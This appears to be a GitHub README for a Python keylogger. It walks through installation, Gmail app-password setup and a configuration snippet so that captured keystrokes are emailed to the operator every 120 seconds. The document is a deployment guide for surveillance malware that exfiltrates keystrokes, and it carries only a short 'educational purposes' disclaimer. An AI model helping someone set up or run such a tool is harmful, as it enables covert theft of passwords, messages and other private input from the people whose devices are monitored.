

## Prerequisites

- Python 3.x
- Gmail account with "Less secure apps" access enabled or App Passwords if two-factor authentication is enabled.

## Installation

1. **Clone the repository**:

    ```bash
    git clone https://github.com/your-username/keylogger.git
    cd keylogger
    ```

2. **Create a virtual environment** (optional but recommended):

    ```bash
    python -m venv venv
    source venv/bin/activate  # On Windows use `venv\Scripts\activate`
    ```

3. **Install the required dependencies**:

    ```bash
    pip install -r requirements.txt
    ```

## Configuration

1. **Enable Less Secure Apps**:
   - Go to your [Google Account Settings](https://myaccount.google.com/lesssecureapps).
   - Turn on "Allow less secure apps".

   **OR**

   **Generate an App Password** (if you have two-factor authentication enabled):
   - Go to your [Google Account Settings](https://myaccount.google.com/apppasswords).
   - Select "Mail" from the app dropdown list and "Other (custom name)" from the device dropdown list.
   - Enter "Keylogger" as the custom name and click "Generate".
   - Use the generated app password instead of your regular Gmail password in the script.

2. **Update the script with your email and app password**:

    ```python
    if __name__ == "__main__":
        my_email = "your_email@gmail.com"
        my_app_password = "your_generated_app_password"
        
        my_keylogger = Keylogger(120, my_email, my_app_password)
        my_keylogger.start()
    ```

    Replace `"your_email@gmail.com"` with your actual Gmail email address and `"your_generated_app_password"` with the app password.

## Usage

1. **Run the script**:

    ```bash
    python keylogger.py
    ```

2. The keylogger will start capturing keystrokes and send them to the specified email address at regular intervals.

## Ethical and Legal Considerations

- This script is for educational purposes only.
- Ensure you have explicit permission to monitor any device you use this on.
- Unauthorized use of keyloggers is illegal and unethical.

## License

This project is licensed under the MIT License.
